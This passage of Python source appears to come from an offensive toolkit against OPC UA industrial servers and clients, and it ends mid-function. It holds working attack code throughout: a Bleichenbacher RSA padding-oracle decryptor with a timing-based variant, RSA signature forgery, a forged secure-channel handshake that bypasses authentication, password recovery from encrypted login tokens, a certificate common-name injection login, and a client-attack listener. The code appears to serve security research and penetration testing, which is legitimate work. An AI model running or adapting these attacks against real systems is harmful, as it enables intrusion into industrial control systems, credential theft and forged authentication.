  def _attempt_query(self, ciphertext):
    self._base._setup()
    payload = ciphertext * self._expansion
    start = time.time()
    try:
      retval = self._base._attempt_query(payload)
    except:
      retval = False
    duration = time.time() - start
      
    try:
      self._base._cleanup()
    except:
      pass
      
    if retval:
      # Apperantly no timing is needed for this one. Edge case that can occur on initial ciphertext.
      return True
    elif duration > self._threshold:
      # Padding seems correct. Repeat with clean connections to gain certainty.
      for i in range(0, self._repeats):
        self._base._setup()
        start = time.time()
        try:
          self._base._attempt_query(payload)
        except:
          pass
        duration = time.time() - start
          
        try:
          self._base._cleanup()
        except:
          pass
          
        if duration < self._threshold:
          return False
       
      # Padding must be right!
      return True
    else:
      return False
        
      
  @classmethod
  def pick_endpoint(clazz, endpoints):
    raise Exception('Call this on base oracle.')

# Carry out a padding oracle attack against a Basic128Rsa15 endpoint.
# Result is ciphertext**d mod n (encoded big endian; any padding not removed).
# Can also be used for signature forging.
def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : bytes) -> bytes:  
  # Bleichenbacher's original attack: https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
  clen = len(ciphertext)
  assert clen % 128 == 0 # Probably not an RSA ciphertext if the key size is not a multiple of 1024 bits.
  k = clen * 8
  
  # Ciphertext as integer.
  c = 0
  for by in ciphertext:
    c *= 256
    c += by
    
  # Extract public key from the endpoint certificate.
  n, e = certificate_publickey_numbers(certificate)
  
  # B encodes as 00 01 00 00 00 .. 00 00
  B = 2**(k-16)
  
  # Metrics for progress reporting.
  query_count = 0
  i = 0
  msize = f'{Decimal(B):.2E}'
    
  # Oracle function.
  def query(candidate):
    nonlocal query_count
    
    # Encode int as bigendian binary to submit it to the oracle.
    result = oracle.query(int2bytes(candidate, clen))
    
    # Report progress for every query.
    query_count += 1
    spinnything = '/-\\|'[(query_count // 30) % 4]
    print(f'[{spinnything}] Progress: iteration {i}; interval size: {msize}; oracle queries: {query_count}', end='\r', file=sys.stderr, flush=True)
    
    return result
    
  # Step 1: blinding. Find a random blind that makes the padding valid. Searching can be skipped if the ciphertext
  # already has valid padding.
  # print('step 1')
  if query(c):
    s0 = 1
    c0 = c
  else:
    while True:
      s0 = randint(1, n)
      c0 = c * pow(s0, e, n) % n
      if query(c0):
        # print(f'c0={c0}', flush=True)
        break
        
  test_factor = lambda sval: query(c0 * pow(sval, e, n) % n)
  
  M_i = {(2 * B, 3 * B - 1)}
  i = 1
  s_i = ceildiv(n, 3*B)

  while True:
    # Step 2: searching for PKCS#1 conforming messages.
    # print(f'step 2; i={i}; s_i={s_i}; M_i={[(hex(a), hex(b)) for a,b in M_i]}', flush=True)
    if i == 1:
      # 2a: starting the search.
      while not test_factor(s_i):
        s_i += 1
    elif len(M_i) > 1:
      # 2b: searching with more than one interval left
      s_i += 1
      while not test_factor(s_i):
        s_i += 1
    else:
      # 2c: searching with one interval left
      (a, b) = next(iter(M_i))
      r_i = ceildiv(2 * (b * s_i - 2 * B), n)
      done = False
      while not done:
        # print(f'r_i={r_i}; {ceildiv(2 * B + r_i * n, b)} <= new_s < {ceildiv(3 * B + r_i * n, a)}', file=sys.stderr, flush=True)
        for new_s in range(ceildiv(2 * B + r_i * n, b), ceildiv(3 * B + r_i * n, a)):
          if test_factor(new_s):
            s_i = new_s
            done = True
            break
        r_i += 1
    
    # Step 3: Narrowing the set of solutions.
    # print(f'step 3; s_i={s_i}',flush=True)
    M_i = {
      (max(a, ceildiv(2*B+r*n, s_i)), min(b, (3*B-1+r*n) // s_i))
        for a, b in M_i
        for r in range(ceildiv(a*s_i-3*B+1, n), (b*s_i-2*B) // n + 1)
    }
    msize = f'{Decimal(sum(b - a for a,b in M_i)):.2E}'
    
    # Step 4: Computing the solution.
    if len(M_i) == 1:
      # print(f'step 4',flush=True)
      a, b = next(iter(M_i))
      if a == b:
        print('', file=sys.stderr, flush=True)
        m = a * pow(s0, -1, n) % n
        return bytes([(m >> bits) & 0xff for bits in reversed(range(0, k, 8))])
    
    i += 1
  
def padding_oracle_testinputs(keylen : int, pubkey : int, goodpads : int, badpads : int) -> list[tuple[bool,int]]:
  # Returns (deterministically generated and shuffled) test cases for padding oracle testing.
  # Result elements conists of a bool indicating whether the input has valid PKCS#1 padding, and said input in 
  # integer form.
  
  TESTSEED = 0x424242
  rng = Random(TESTSEED)
  
  # For 'correct' test cases. First pick random padding size and then randomize both padding and data.
  datasizes = [rng.randint(0, keylen - 11) for _ in range(0, goodpads)]
  padvals = [sum(rng.randint(1,255) << (i * 8) for i in range(0, keylen - ds - 3)) for ds in datasizes]
  correctpadding = [
    (2 << 8 * (keylen - 2)) + \
    (padval << 8 * (ds + 1)) + \
    rng.getrandbits(8 * ds)
    for padval, ds in zip(padvals, datasizes)
  ]
  
  # As incorrect padding, just pick uniform random numbers modulo n not starting with 0x0002.
  wrongpadding = [rng.randint(1, pubkey) for _ in range(0, badpads)]
  for i in range(0, badpads):
    while wrongpadding[i] >> (8 * (keylen - 2)) == 2:
      wrongpadding[i] = rng.randint(1, pubkey)
  
  # Mix order of correct and incorrect padding.
  testcases = [(True, p) for p in correctpadding] + [(False, p) for p in wrongpadding]
  rng.shuffle(testcases)
  return testcases
  
def padding_oracle_quality(
    certificate : bytes, oracle : PaddingOracle, 
    goodpads : int = 100, badpads : int = 100
  ) -> int:
  # Gives a score between 0 and 100 on how "strong" the padding oracle is.
  # This is determined by encrypting testing 100 plaintexts with correct padding and 100 with incorrect padding.
  # The score is based on the number of correct padding correctly reported as such is returned.
  # If any incorrectly padded plaintext is reported as valid, 0 is returned.
  # Will not catch PaddingOracle exceptions.
  
  # Extract public key from certificate as Python ints.
  keylen = certificate_publickey(certificate).size_in_bytes()
  n, e = certificate_publickey_numbers(certificate)
  testcases = padding_oracle_testinputs(keylen, n, goodpads, badpads)
  
  # Perform the test.
  score = 0
  for i, (padding_right, plaintext) in enumerate(testcases):
    progress = i * 200 // (goodpads + badpads)
    progbar = '=' * (progress // 2) + ' ' * (100 - progress // 2)
    print(f'[*] Progress: [{progbar}]', file=sys.stderr, end='\r', flush=True)
    if oracle.query(int2bytes(pow(plaintext, e, n), keylen)):
      if padding_right:
        # Correctly identified valid padding.
        score += 1
      else:
        # Our Bleichenbacher attack can't deal with false negatives.
        return 0
  
  print(f'[*] Progress: [{"=" * 100}]', file=sys.stderr, flush=True)
  return score * 100 // goodpads


def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_threshold : float, timing_expansion : int) -> tuple[PaddingOracle, endpointDescription.Type]:
  # Try finding a working padding oracle against an endpoint.
  assert try_opn or try_password
  endpoints = get_endpoints(url)
  
  log(f'Checking {len(endpoints)} endpoints of {url} for RSA padding oracle.')
  
  possible_oracles = []
  if try_opn:
    possible_oracles.append(('OPN', OPNPaddingOracle))
  if try_password:
    possible_oracles += [
      ('Password', PasswordPaddingOracle), 
      ('Password (alt)', AltPasswordPaddingOracle),
    ]
  
  bestname, bestep, bestoracle, bestscore = None, None, None, 0
  for oname, oclass in possible_oracles:
    endpoint = oclass.pick_endpoint(endpoints)
    if endpoint:
      log(f'Endpoint "{endpoint.endpointUrl}" qualifies for {oname} oracle.')
      log(f'Trying a bunch of known plaintexts to assess {oname} oracle quality and reliability...')
      oracle = oclass(endpoint)
      try:
        try:
          quality = padding_oracle_quality(endpoint.serverCertificate, oracle)
          log(f'{oname} padding oracle score: {quality}/100')
        except ServerError as err:
          if err.errorcode == 0x80550000 and endpoint.securityPolicyUri != SecurityPolicy.BASIC128RSA15:
            log(f'Got error 0x80550000 (BadSecurityPolicyRejected). Implies {oname} downgrade to Basic128Rsa15 not accepted.')
          else:
            log(f'Got server error {hex(err.errorcode)} ("{err.reason}"). Don\'t know how to interpret it. Skipping {oname} oracle.')
          quality = 0
        except Exception as ex:
          log(f'Exception {type(ex).__name__} raised ("{ex}"). Skipping {oname} oracle.')
          quality = 0
        
        if quality == 100:
          log(f'Great! Let\'s use it.')
          return oracle, endpoint
        elif quality > bestscore:
          bestname, bestep, bestoracle, bestscore = oname, endpoint, oracle, quality
        elif quality == 0 and timing_threshold > 0:
          log(f'Base {oname} not working. Testing timing-based variant (threshold: {timing_threshold} seconds); this may take a minute.')
          toracle = TimingBasedPaddingOracle(endpoint, oclass(endpoint), timing_threshold, timing_expansion)
          quality = padding_oracle_quality(endpoint.serverCertificate, toracle, 10, 100)
          log(f'Timing-based {oname} padding oracle score: {quality}/100')
          
          # Prefer non-timing oracles, even if they have (up to three times) more false negatives.
          quality = ceildiv(quality, 3)
          if quality > bestscore:
            bestname, bestep, bestoracle, bestscore = f'Timing-based {oname}', endpoint, toracle, quality
          
      except ServerError as err:
        log(f'Got server error {hex(err.errorcode)} ("{err.reason}"). Don\'t know how to interpret it. Skipping {oname} oracle.')
      except Exception as ex:
        log(f'Exception {type(ex).__name__} raised ("{ex}"). Skipping {oname} oracle.')
    else:
      log(f'None of the endpoints qualify for {oname} oracle.')

  if bestscore > 0:
    log(f'Continuing with {bestname} padding oracle for endpoint {bestep.endpointUrl}.')
    return bestoracle, bestep
  elif timing_threshold == 0:
    raise AttackNotPossible(f'Can\'t find exploitable padding oracle. Maybe try the timing attack?')
  else:
    raise AttackNotPossible(f'Can\'t find exploitable padding oracle.')

def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password : bool, timing_threshold : float, timing_expansion : int):
  # Use padding oracle to decrypt a ciphertext.
  # Logs the result, and also tries parsing it.
  
  oracle, endpoint = find_padding_oracle(url, try_opn, try_password, timing_threshold, timing_expansion)
  
  log(f'Running padding oracle attack...')
  result = rsa_decryptor(oracle, endpoint.serverCertificate, ciphertext)
  log_success(f'Success! Raw result: {hexlify(result).decode()}')
  
  # Check how plaintext is padded and display unpadded version.
  unpadded = None
  if result.startswith(b'\x00\x02'):
    try:
      unpadded = remove_rsa_padding(result, SecurityPolicy.BASIC128RSA15)
      log(f'Plaintext appears to use PKCS#1v1.5 padding. Unpadded value:')
    except:
      pass
  else:
    unpadded = decode_oaep_padding(result, 'sha1')
    if unpadded is not None:
      log('Plaintext uses OAEP padding (SHA-1 hash). Unpadded value:')
    else:
      unpadded = decode_oaep_padding(result, 'sha256')
      if unpadded is not None:
        log('Plaintext uses OAEP padding (SHA-256 hash). Unpadded value:')
  
  if unpadded is None:
    if result.startswith(b'\x00\x01'):
      log('Looks like the payload may be a signature instead of a ciphertext.')
    else:
      log('Result does not look like either PKCS#1v1.5 or OAEP padding. Maybe something went wrong?')
  else:
    log_success(hexlify(unpadded).decode())
    
    # Check if this looks like a password.
    try:
      lenval, tail = IntField().from_bytes(unpadded)
      if 32 <= lenval <= len(tail):
        pwd = tail[:lenval-32].decode('utf8')
        log('Looks like an encrypted UserIdentityToken with a password.')
        log_success(f'Password: {pwd}')
        return
    except:
      pass
      
    # Check if this looks like an OPN message.
    for msgtype in [openSecureChannelRequest, openSecureChannelResponse]:
      try:
        convo, _ = encodedConversation.from_bytes(unpadded)
        msg, _ = msgtype.from_bytes(convo.requestOrResponse)
        log('Looks like an OPN message:')
        log_success(f'{repr(msg)}')
        return
      except:
        pass

def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, policy : SecurityPolicy, timing_threshold : float, timing_expansion : int) -> bytes:
  # Use padding oracle to forge an RSA PKCS#1 signature on some arbitrary payload.
  # Logs and returns signature.
  
  assert policy != SecurityPolicy.NONE
  if policy == SecurityPolicy.AES256_SHA256_RSAPSS:
    raise AttackNotPossible('Spoofing PSS signature is possible but currently not yet implemented.')
  
  hasher = 'sha1' if policy == SecurityPolicy.BASIC128RSA15 else 'sha256'
  oracle, endpoint = find_padding_oracle(url, try_opn, try_password, timing_threshold, timing_expansion)  
  # Compute padded hash to be used as 'ciphertext'.
  sigsize = certificate_publickey(endpoint.serverCertificate).size_in_bytes()
  padhash = pkcs1v15_signature_encode(hasher, payload, sigsize)
  log(f'Padded hash of payload: {hexlify(padhash).decode()}')
  log(f'Starting padding oracle attack...')
  sig = rsa_decryptor(oracle, endpoint.serverCertificate, padhash)
  log_success(f'Succes! Forged signature:')
  log_success(hexlify(sig).decode())
  return sig
  
def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):  
  log(f'Attempting to log in to {url} with CN {cn} in self-signed certificate.')
  
  mycert, privkey = selfsign_cert(SELFSIGNED_CERT_TEMPLATE, cn, datetime.now() + timedelta(days=100))
  log(f'Generated self-signed certificate with CN {cn}.')
  log(f'SHA-1 thumbprint: {hexlify(certificate_thumbprint(mycert)).decode().upper()}')
  
  endpoints = get_endpoints(url)
  log(f'Server advertises {len(endpoints)} endpoints.')
  
  # Pick any with a non-None policy, preferably with None user authentication.
  # Also prefer TCP over HTTPS endpoint; shouldn't matter much for attack, but former is easier to sniff.
  ep = max(endpoints, key=lambda ep: [
    ep.securityPolicyUri != SecurityPolicy.NONE, 
    any(t.tokenType == UserTokenType.ANONYMOUS for t in ep.userIdentityTokens),
    ep.transportProfileUri.endswith('uatcp-uasc-uabinary'),
  ])
  if ep.securityPolicyUri == SecurityPolicy.NONE:
    raise AttackNotPossible('Server only supports None security policy.')
    
  def trylogin():
    try:
      proto, _, _ = parse_endpoint_url(url)
      if proto == TransportProtocol.TCP_BINARY:
        sock = connect_and_hello(url)
        chan = authenticated_opn(sock, ep, mycert, privkey)
        log_success('Certificate was accepted during OPN handshake. Will now try to create a session with it.')
      else:
        assert proto == TransportProtocol.HTTPS
        chan = url
      
      createreply = generic_exchange(chan, ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
        requestHeader=simple_requestheader(),
        clientDescription=applicationDescription.create(
          applicationUri=TEMPLATE_APP_URI,
          productUri=cn,
          applicationName=LocalizedText(text=cn),
          applicationType=ApplicationType.CLIENT,
          gatewayServerUri=None,
          discoveryProfileUri=None,
          discoveryUrls=[],
        ),
        serverUri=ep.server.applicationUri,
        endpointUrl=ep.endpointUrl,
        sessionName=None,
        clientNonce=os.urandom(32),
        clientCertificate=mycert,
        requestedSessionTimeout=600000,
        maxResponseMessageSize=2**24,
      )
      if not createreply.serverNonce and ep.securityPolicyUri != SecurityPolicy.NONE:
        log('Server did not sign nonce even though security policy is not none. Assuming this indicates authentication failure.')
        return None
        
      log_success('CreateSessionRequest with certificate accepted.')      
      anon_policies = [p for p in ep.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
      if anon_policies:
        log('Trying to activate session.')
        activatereply = generic_exchange(chan, ep.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
          requestHeader=simple_requestheader(createreply.authenticationToken),
          clientSignature=signatureData.create(
            algorithm=rsa_siguri(ep.securityPolicyUri),
            signature=createreply.serverNonce and rsa_sign(ep.securityPolicyUri, privkey, ep.serverCertificate + createreply.serverNonce),
          ),
          clientSoftwareCertificates=[],
          localeIds=[],
          userIdentityToken=anonymousIdentityToken.create(policyId=anon_policies[0].policyId),
          userTokenSignature=signatureData.create(algorithm=None,signature=None),
        )
        log_success('Authentication with certificate was succesfull!')
        return chan, createreply.authenticationToken
      else:
        log(f'Server requires user authentication, which is not implemented for this attack. Will stop here.')
        return None
    except ServerError as err:
      log(f'Login blocked. Server responsed with error {hex(err.errorcode)}: "{err.reason}"')
      return None      
        
  log(f'Trying to submit cert to endpoint {ep.endpointUrl}.')
  chantoken = trylogin()
  
  if not chantoken and second_login:
    log('Trying the second authentication attempt...')
    chantoken = trylogin()
    
  if chantoken and demo:
    demonstrate_access(*chantoken, ep.securityPolicyUri)
    

def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, timing_threshold : float, timing_expansion : int) -> OpenSecureChannelMessage:
  # Use the padding oracle attack (against impersonate_endpoint) to forge a reusable signed and encrypted OPN request, that can be used against login_endpoint.  
  assert login_endpoint.securityPolicyUri != SecurityPolicy.NONE
  
  plaintext = encodedConversation.to_bytes(encodedConversation.create(
    sequenceNumber=1,
    requestId=1,
    requestOrResponse=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
      requestHeader=simple_requestheader(),
      clientProtocolVersion=0,
      requestType=SecurityTokenRequestType.ISSUE,
      securityMode=login_endpoint.securityMode,
      clientNonce=SPOOFED_OPN_NONCE,
      requestedLifetime=3600000, # 1000 hours
    ))
  ))
  msg = OpenSecureChannelMessage(
    secureChannelId=0,
    securityPolicyUri=login_endpoint.securityPolicyUri,
    senderCertificate=impersonate_endpoint.serverCertificate,
    receiverCertificateThumbprint=certificate_thumbprint(login_endpoint.serverCertificate),
    encodedPart=plaintext
  )
  
  log('Trying sigforge attack to produce OPN signature.')
  imp_pk = certificate_publickey(impersonate_endpoint.serverCertificate)
  login_pk = certificate_publickey(login_endpoint.serverCertificate)
  login_sp = login_endpoint.securityPolicyUri
  msg.sign_and_encrypt(
    signer=lambda data: forge_signature_attack(impersonate_endpoint.endpointUrl, data, opn_oracle, password_oracle, login_sp, timing_threshold, timing_expansion),
    encrypter=lambda ptext: rsa_ecb_encrypt(login_sp, login_pk, ptext),
    plainblocksize=rsa_plainblocksize(login_sp, login_pk),
    cipherblocksize=login_pk.size_in_bytes(),
    sigsize=imp_pk.size_in_bytes(),
  )
  
  log(f'Message bytes after applying encryption: {hexlify(msg.to_bytes()).decode()}')
  return msg
  
def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, cache : Path, timing_threshold : float, timing_expansion : int) -> ChannelState:
  lproto, lhost, lport = parse_endpoint_url(login_endpoint.endpointUrl)
  if lproto != TransportProtocol.TCP_BINARY:
    raise AttackNotPossible('Target endpoint should use opc.tcp protocol.')
  
  # Attempts to set up a secure channel without knowing the private key, by exploiting a padding oracle twice.
  cachedata = {}
  if cache.exists():
    try:
      with cache.open('r') as infile:
        cachedata = json.load(infile)
    except:
      log(f'Error parsing {cache} contents. Ignoring it and starting a new cache file.')
      
  # An OPN can be reused as long as the endpoints use the same certificates and security policies.
  ep_id = lambda ep: f'{hexlify(certificate_thumbprint(ep.serverCertificate)).decode()}-{ep.securityPolicyUri.name}-{ep.securityMode}'
  cachekey = f'{ep_id(impersonate_endpoint)}/{ep_id(login_endpoint)}'
  if cachekey in cachedata:
    log('Using signed+encrypted OPN request from cache.')
    opn_req = OpenSecureChannelMessage()
    opn_req.from_bytes(BytesIO(b64decode(cachedata[cachekey])))
  else:
    opn_req = forge_opn_request(impersonate_endpoint, login_endpoint, opn_oracle, password_oracle, timing_threshold, timing_expansion)
    log(f'Storing signed+encrypted OPN request in cache file {cache}.')
    cachedata[cachekey] = b64encode(opn_req.to_bytes()).decode()
    with cache.open('w') as outfile:
      json.dump(cachedata, outfile)
  
  log('Picking a padding oracle for decryption.')
  oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle, timing_threshold, timing_expansion)
  
  log('Performing the OPN handshake...')
  login_sock = connect_and_hello(login_endpoint.endpointUrl)
  keepalive.set(login_sock)
  opn_reply = opc_exchange(login_sock, opn_req)
  
  log_success('Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.')
  cipherblocksize = certificate_publickey(oracle_ep.serverCertificate).size_in_bytes()
  assert len(opn_reply.encodedPart) % cipherblocksize == 0
  decrypted = rsa_decryptor(oracle, oracle_ep.serverCertificate, opn_reply.encodedPart[:cipherblocksize])
  
  log_success(f'Success! Got the following plaintext: {hexlify(decrypted).decode()}')
  unpadded = remove_rsa_padding(decrypted, login_endpoint.securityPolicyUri)
  if not unpadded:
    raise Exception(f'Failed to unpad RSA plaintext {hexlify(decrypted).decode()} (SP: {login_endpoint.securityPolicyUri})')
  
  # Assuming response fits in single plaintext block.
  log('Removed padding. Now parsing OpenSecureChannelResponse to extract channel ID and secret nonce:')
  opn_resp, _ = openSecureChannelResponse.from_bytes(encodedConversation.from_bytes(unpadded)[0].requestOrResponse)
  log_object('openSecureChannelResponse', opn_resp)
  
  return ChannelState(
    sock=login_sock,
    channel_id=opn_resp.securityToken.channelId,
    token_id=opn_resp.securityToken.tokenId,
    msg_counter=2,
    securityMode=login_endpoint.securityMode,
    crypto=deriveKeyMaterial(login_endpoint.securityPolicyUri, SPOOFED_OPN_NONCE, opn_resp.serverNonce),
  )
    
def log_object(name: str, data : Any, depth : int = 0):
  prefix = ' ' * (depth - 1) + '|' if depth > 0 else ''
  datadict = None
  if isinstance(data, tuple) and hasattr(data, '_asdict'):
    datadict = data._asdict()
  elif dataclasses.is_dataclass(data):
    datadict = dataclasses.asdict(data)
  elif type(data) == list:
    datadict = dict(enumerate(data))
    
    
  if datadict:
    log(f'{prefix}+ {name} ({type(data).__name__}):')
    for fieldname, fieldval in datadict.items():
      log_object(fieldname, fieldval, depth+1)
  else:
    if type(data) == bytes:
      datastr = hexlify(data).decode()
    elif type(data) == LocalizedText:
      datastr = data.text
    elif data is None:
      datastr = 'NULL'
    else:
      datastr = str(data)
      
    if len(datastr) > 200:
      datastr = datastr[:40] + "..."
      
    log(f'{prefix}+ {name}: {datastr}')
  
    
def server_checker(url : str, test_timing_attack : bool):
  log(f'Checking {url}...')
  endpoints = get_endpoints(url)
  encrypt_endpoints = [i for i, ep in enumerate(endpoints) if ep.securityMode == MessageSecurityMode.SIGN_AND_ENCRYPT]
  log(f'{len(endpoints)} endpoints:')
  findings = []
  pkcs1_ep = None
  
  log('-----------------------')
  for i, ep in enumerate(endpoints, start=1):
    epname = f'Endpoint #{i} ({ep.endpointUrl})'
    log_object(epname, ep)
    log('-----------------------')
    
    tokentypes = [t.tokenType for t in ep.userIdentityTokens]
    
    # HTTPS reflect/relay.
    relay_candidate = False
    if ep.securityPolicyUri == SecurityPolicy.NONE and UserTokenType.ANONYMOUS in tokentypes:
      findings.append(f'{epname} allows anonymous access. It might not require authentication for data access.')
    if ep.transportProfileUri.endswith('https-uabinary'):
      findings.append(f'{epname} supports the HTTPS protocol. It may be vulnerable to a reflect/relay attack.')
      relay_candidate = True
      
    # Padding oracle.
    if ep.securityPolicyUri == SecurityPolicy.BASIC128RSA15:
      findings.append(f'{epname} supports the vulnerable Basic128Rsa15 policy. It may be vulnerable to a padding oracle attack (which would enable reflect, relay, decrypt and sigforge).')
      relay_candidate = True
      pkcs1_ep = ep
    if ep.securityPolicyUri == SecurityPolicy.NONE and UserTokenType.USERNAME in tokentypes:
      if any(t.tokenType == UserTokenType.USERNAME and t.securityPolicyUri == SecurityPolicy.BASIC128RSA15 for t in ep.userIdentityTokens):
        findings.append(f'{epname} supports password encryption with Basic128Rsa15. It may be vulnerable to a padding oracle attack (which would enable reflect, relay, decrypt and sigforge).')
        relay_candidate = True
      else:
        findings.append(f'{epname} supports password encryption. If PKCS#1v1.5 passwords are accepted it may be vulnerable to a padding oracle attack (which would enable reflect, relay, decrypt and sigforge).')
        relay_candidate = True
    
    # User cert relay.
    if relay_candidate and UserTokenType.CERTIFICATE in tokentypes:
      findings.append(f'{epname} supports user authentication with certificates. Could potentially also be bypassed via reflect or relay.')
    
    # Discovery warning.
    if url not in ep.server.discoveryUrls:
      findings.append('Requested URL not in endpoint discovery URL list. Maybe try checking one of the discovery URLs as well?')
    
    # Downgrade attacks. TODO: confirm
    # if ep.securityPolicyUri == SecurityPolicy.NONE and UserTokenType.USERNAME in tokentypes or UserTokenType.ISSUEDTOKEN in tokentypes:
    #   findings.append(f'{epname} supports user password or token authentication over a None channel. May be vulnerable to a disclosure via a MitM downgrade.')
  
    # if ep.securityMode == MessageSecurityMode.SIGN and encrypt_endpoints:
    #   if len(encrypt_endpoints) > 0:
    #     secondpart = ' and '.join(f'endpoint #{epnum}' for epnum in encrypt_endpoints) + ' support SIGN_AND_ENCRYPT'
    #   else:
    #     secondpart = f'endpoint #{encrypt_endpoints[0]} supports SIGN_AND_ENCRYPT'
    #   findings.append(f'{epname} has security mode SIGN while {secondpart}. It may be vulnerable to a MitM downgrade.')
  
  if findings:
    log('')
    log('Findings:')
    for f in findings:
      log_success(f)
  else:
    log('No findings about these endpoints.')
    
  log('Note: cn-inject vulnerabilities have not been checked.')
  if not test_timing_attack and not pkcs1_ep:
    log('Note: Even when Basic128Rsa15 is not supported, the padding oracle may still work. Try running with -t.')
    
  if test_timing_attack:
    if not pkcs1_ep:
      i, pkcs1_ep = max(enumerate(endpoints, start=1), key=lambda i_ep: [i_ep[1].transportProfileUri.endswith('uatcp-uasc-uabinary'), i_ep[1].securityPolicyUri != SecurityPolicy.NONE])
      log(f'No endpoint advertising Basic128Rsa15. Trying Endpoint #{i} with policy {pkcs1_ep.securityPolicyUri.value} instead.')
    
    log('Testing OpenSecureChannel timing attack...')
    results = {}
    for expandval in [10,30,50,100]:
      log(f'Expansion parameter {expandval}:')
      keylen = certificate_publickey(pkcs1_ep.serverCertificate).size_in_bytes()
      n, e = certificate_publickey_numbers(pkcs1_ep.serverCertificate)
      okpads = 50
      nokpads = 50
      ok_time = 0
      nok_time = 0
      minok = math.inf
      maxnok = 0
      for i, (padding_ok, plaintext) in enumerate(padding_oracle_testinputs(keylen, n, okpads, nokpads), start=1):
        inputval = int2bytes(pow(plaintext, e, n), keylen) * expandval
        oracle = OPNPaddingOracle(pkcs1_ep)
        oracle._setup()
        starttime = time.time()
        try:
          oracle._attempt_query(inputval)
        except:
          pass
        duration = time.time() - starttime
        
        log(f'Test {i}: {"good" if padding_ok else "bad"} padding; time: {duration}')
        if padding_ok:
          ok_time += duration
          minok = min(duration, minok)
        else:
          nok_time += duration
          maxnok = max(duration, maxnok)
        
        try:
          oracle._cleanup()
        except:
          pass
      
      results[expandval] = {
        'avgok': ok_time / okpads,
        'minok': minok,
        'avgnok': nok_time / nokpads,
        'maxnok': maxnok
      }
      log('-----------------')
        
    log('Timing experiment results:')
    for expandval, result in results.items():
      log_success(f'Expansion parameter {expandval}:')
      log_success(f'Average time with correct padding: {result["avgok"]}')
      log_success(f'Average time with incorrect padding: {result["avgnok"]}')
      log_success(f'Shortest time with correct padding: {result["minok"]}')
      log_success(f'Longest time with incorrect padding: {result["maxnok"]}')
      log_success('-----------------')


def auth_check(url : str, skip_none : bool, demo : bool):
  # Tests whether server allows authentication at all.
  endpoints = get_endpoints(url)
  
  chan, token = None, None
  if not skip_none:
    for ep in endpoints:
      if ep.securityPolicyUri == SecurityPolicy.NONE:
        try:
          log(f'Trying to log in to None endpoint {ep.endpointUrl}')
          proto, _, _ = parse_endpoint_url(url)
          chan = unencrypted_opn(connect_and_hello(url)) if proto == TransportProtocol.TCP_BINARY else url
          createreply = generic_exchange(chan, SecurityPolicy.NONE, createSessionRequest, createSessionResponse, 
            requestHeader=simple_requestheader(),
            clientDescription=applicationDescription.create(
              applicationUri=TEMPLATE_APP_URI,
              productUri=TEMPLATE_APP_URI,
              applicationName=LocalizedText(text=TEMPLATE_APP_URI),
              applicationType=ApplicationType.CLIENT,
              gatewayServerUri=None,
              discoveryProfileUri=None,
              discoveryUrls=[],
            ),
            serverUri=ep.server.applicationUri,
            endpointUrl=ep.endpointUrl,
            sessionName=None,
            clientNonce=None,
            clientCertificate=ep.serverCertificate,
            requestedSessionTimeout=600000,
            maxResponseMessageSize=2**24,
          )
          
          log(f'CreateSessionRequest succeeded. Now trying to activate it...')
          
          anon_policies = [p for p in ep.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
          id_token = anonymousIdentityToken.create(policyId=anon_policies[0].policyId) if anon_policies else None
          activatereply = generic_exchange(chan, SecurityPolicy.NONE, activateSessionRequest, activateSessionResponse, 
            requestHeader=simple_requestheader(createreply.authenticationToken),
            clientSignature=signatureData.create(algorithm=None,signature=None),
            clientSoftwareCertificates=[],
            localeIds=[],
            userIdentityToken=id_token,
            userTokenSignature=signatureData.create(algorithm=None,signature=None),
          )
          log_success('Session activation successful!')
          if demo:
            demonstrate_access(chan, createreply.authenticationToken, SecurityPolicy.NONE)
          return
        except ServerError as err:
          log(f'Attempt failed due to server error {hex(err.errorcode)}: "{err.reason}"')
        except Exception as ex:
          log(f'Attempt failed due to Exception {type(ex).__name__}: "{ex}"')
  
    log('Anonymous login didn\'t work. Trying self-signed certificate next.')
    
  inject_cn_attack(url, TEMPLATE_APP_URI, False, demo)
  
# While acting as a server, read an OPC message from a client.
def read_client_msg(sock : socket, msg_type : Type[OpcMessage]) -> OpcMessage:
  with sock.makefile('rb') as sockio:
    msg = msg_type()
    msg.from_bytes(sockio)
    return msg

# Same for writing.
def write_client_msg(sock : socket, msg : OpcMessage, final_chunk : bool=True):
  with sock.makefile('wb') as sockio:
    sockio.write(msg.to_bytes(final_chunk))
    sockio.flush()
    
# A client attack is a coroutine that receives client connection sockets.
ClientAttack = Generator[None, socket, None]
      
# Sets up and executes an attack against (taking server endpoints as a parameter) an OPC client instead of a server. 
# Also capable of forcing a client connection via ReverseHello, in which case the listen address is used as an 
# endpointUri in the Reversehello message.
def client_attack(
    attacker_factory : Callable[[List[endpointDescription.Type]], ClientAttack], 
    server_url : str,
    listen_host : str, listen_port : int,
    revhello_addr  : Optional[Tuple[str, int]] = None,
    persist : bool = False
  ):
    # First try connecting to the server.
    server_eps = get_endpoints(server_url)
    log(f'Got {len(server_eps)} server endpoints from {server_url}.')

    if revhello_addr is None:
      # Start listening for client connection.
      listener = create_server((listen_host, listen_port))
      log(f'Started listening for an incoming client connections on {listen_host}:{listen_port}.')
      def clientsocker():
        clientsock, peeraddr = listener.accept()
        log_success(f'Received a connection from {peeraddr[0]}:{peeraddr[1]}.')
        return clientsock
    else:
      server_uri = server_eps[0].server.applicationUri
      revurl = f'opc.tcp://{listen_host}:{listen_port}/'
      def clientsocker():
        log(f'Connecting to client {":".join(revhello_addr)}...')
        clientsock = socket.create_connection(revhello_addr)
        log(f'Connected. Now sending ReverseHello with server URI "{server_uri}" and endpoint URL "{revurl}".')
